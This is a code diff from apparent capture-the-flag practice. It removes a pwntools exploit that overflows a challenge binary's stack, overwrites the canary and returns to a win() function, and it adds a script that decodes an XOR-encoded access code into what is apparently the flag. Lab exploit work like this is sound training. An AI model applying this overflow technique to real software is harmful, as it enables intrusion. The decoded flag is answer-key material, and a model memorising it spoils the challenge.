@@ -1,15 +1,25 @@
-from pwn import *
+KEY = 0x2A
 
-p = process("./bof_chal")
-p.recvuntil(b"address: ")
-win_addr = int(p.recvline().strip(), 16)
-log.success(f"win() @ {hex(win_addr)}")
+# the expected (encoded) access code
+TARGET = [98, 101, 110, 27, 32, 86, 74, 32, 100, 34, 98, 128, 106,
+          101, 109, 46, 110, 134, 91, 89, 47, 46, 90, 117, 141, 114,
+          53, 105, 53, 116]
 
-payload = b""
-payload += b"A" * 104 #Overwriting stack until canary
-payload += p32(0xbeef) #Bypassing Canary
-payload += b"B" * 8 #Overwriting saved rbp -> Return base pointer, back to the original main function
-payload += p64(win_addr)
 
-p.sendlineafter(b"input: ", payload)
-p.interactive()
+def check(code: str) -> bool:
+    if len(code) != len(TARGET):
+        return False
+    for i, ch in enumerate(code):
+        # each character is XOR'd with KEY, then the position is added
+        if (ord(ch) ^ KEY) + i != TARGET[i]:
+            return False
+    return True
+
+def decode(target):
+    output = []
+    for i, ch in enumerate(target):
+        output.append((target[i] - i) ^ KEY)
+
+    return output
+
+print("".join(chr(i) for i in decode(TARGET)))
